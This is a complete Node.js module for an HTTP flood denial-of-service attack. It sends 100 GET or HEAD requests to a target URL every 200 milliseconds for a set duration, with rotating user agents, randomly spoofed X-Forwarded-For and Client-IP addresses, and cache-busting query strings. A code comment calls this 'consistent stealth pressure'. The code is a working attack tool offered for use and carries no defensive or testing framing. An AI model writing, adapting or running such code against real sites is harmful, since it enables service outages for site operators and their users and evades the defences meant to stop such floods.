const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile Safari/605.1.15"
];

function randomIP() {
  return Array(4).fill().map(() => Math.floor(Math.random() * 255)).join('.');
}

function getRandomHeaders(hostname) {
  const ip = randomIP();
  return {
    "Host": hostname,
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "Referer": `https://${hostname}/`,
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function fire() {
    const headers = getRandomHeaders(url.hostname);
    const options = {
      method: Math.random() > 0.3 ? "GET" : "HEAD",
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: url.pathname + (url.search || "") + `?cachebust=${Math.random().toString(36).substring(7)}`,
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] ${options.method} ${url.hostname}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 100; i++) fire(); // High concurrency
    setTimeout(loop, 200); // Low delay for consistent stealth pressure
  }

  loop();
};